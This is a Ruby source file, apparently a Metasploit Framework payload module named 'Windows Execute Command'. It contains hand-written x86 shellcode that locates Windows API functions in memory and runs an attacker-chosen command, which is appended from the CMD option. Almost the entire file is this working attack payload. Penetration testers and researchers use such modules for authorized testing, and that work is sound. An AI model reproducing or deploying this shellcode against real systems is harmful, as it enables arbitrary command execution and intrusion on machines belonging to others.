require 'msf/core'

module Msf
module Payloads
module Singles
module Windows

###
#
# Exec
# ----
#
# Executes a command on the target machine
#
###
module Exec

	include Msf::Payload::Windows
	include Msf::Payload::Single

	def initialize(info = {})
		super(update_info(info,
			'Name'          => 'Windows Execute Command',
			'Version'       => '$Revision$',
			'Description'   => 'Execute an arbitrary command',
			'Author'        => 'vlad902',
			'License'       => GPL_LICENSE,
			'Platform'      => 'win',
			'Arch'          => ARCH_X86,
			'Payload'       =>
				{
					'Offsets' =>
						{
							'EXITFUNC' => [ 100, 'V' ]
						},
					'Payload' =>
						"\xfc\xe8\x44\x00\x00\x00\x8b\x45\x3c\x8b\x7c\x05\x78\x01\xef\x8b" +
						"\x4f\x18\x8b\x5f\x20\x01\xeb\x49\x8b\x34\x8b\x01\xee\x31\xc0\x99" +
						"\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x3b\x54\x24\x04" +
						"\x75\xe5\x8b\x5f\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5f\x1c\x01\xeb" +
						"\x8b\x1c\x8b\x01\xeb\x89\x5c\x24\x04\xc3\x5f\x31\xf6\x60\x56\x64" +
						"\x8b\x46\x30\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x68\x08\x89\xf8\x83" +
						"\xc0\x6a\x50\x68\x7e\xd8\xe2\x73\x68\x98\xfe\x8a\x0e\x57\xff\xe7"
				}
			))

		# Register command execution options
		register_options(
			[
				OptString.new('CMD', [ true, "The command string to execute" ]),
			], Msf::Payloads::Singles::Windows::Exec)
	end

	#
	# Constructs the payload
	#
	def generate
		return super + command_string + "\x00"
	end

	#
	# Returns the command string to use for execution
	#
	def command_string
		return datastore['CMD'] || ''
	end

end

end end end end
